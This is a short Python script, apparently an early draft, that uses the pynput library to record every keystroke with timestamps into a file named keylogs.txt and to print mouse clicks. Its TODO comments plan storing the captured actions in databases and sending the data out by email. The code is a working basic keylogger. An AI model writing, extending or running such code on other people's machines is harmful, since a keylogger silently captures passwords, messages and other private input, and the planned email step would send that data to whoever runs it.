#!/usr/bin/python
# -*- coding: utf-8 -*-

# TODO
# 1. Check possibility of automatically installing packages
# 2. Create Loggs that's saying whether mouse or keyboard was used, think about splitting it
# 3. Create databases to store actions
# 4. Create Plots, Dashboard and analyse the data
# 5. Find solution to send data by email etc.
# 6.


from pynput import keyboard, mouse
import logging


log_dir = ""
logging.basicConfig(filename=(log_dir + "keylogs.txt"), level=logging.DEBUG, format="%(asctime)s: %(message)s")


def on_press(key):
    logging.info(str(key))
    print(key)


def mouse_press(*args):
    print(args)


with keyboard.Listener(on_press=on_press) as listener, mouse.Listener(on_click=mouse_press) as listener_mouse:
    listener.join()
